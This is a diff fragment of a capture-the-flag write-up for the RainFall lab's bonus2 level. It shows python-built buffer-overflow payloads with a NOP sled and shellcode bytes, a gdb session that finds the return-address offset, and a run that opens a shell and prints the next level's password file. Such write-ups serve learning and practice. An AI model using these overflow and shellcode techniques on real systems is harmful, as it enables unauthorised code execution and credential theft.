@@ -71,3 +71,23 @@ $(python -c 'print("A" * 18 + "\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x6
 $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")') h
 
 $(python -c 'print("A" * 100)') h
+
+```
+    (gdb) run hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Starting program: /home/user/bonus2/bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41366141 in ?? ()
+```
+
+the offset is 18
+
+hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")')
+
+```
+    bonus2@RainFall:~$ ./bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")')
+    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAAAAAAAAAAAAAAAAAA����
+    $ cat /home/user/bonus3/.pass
+    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
